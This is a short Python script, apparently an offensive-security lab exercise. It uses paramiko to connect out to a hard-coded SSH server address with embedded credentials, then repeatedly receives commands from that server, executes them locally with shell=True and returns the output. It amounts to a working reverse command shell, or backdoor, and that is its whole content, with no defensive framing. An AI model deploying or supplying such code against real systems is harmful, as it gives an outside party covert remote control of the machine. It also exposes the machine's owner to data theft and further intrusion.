import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())  # Read the banner
        
        while True:
            command = ssh_session.recv(1024).decode()  # Get the command from the SSH server
            if not command:
                break
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e).encode())
        client.close()
    return 

ssh_command('10.0.2.15', 'justin', 'lovesthepython', 'ClientConnected')
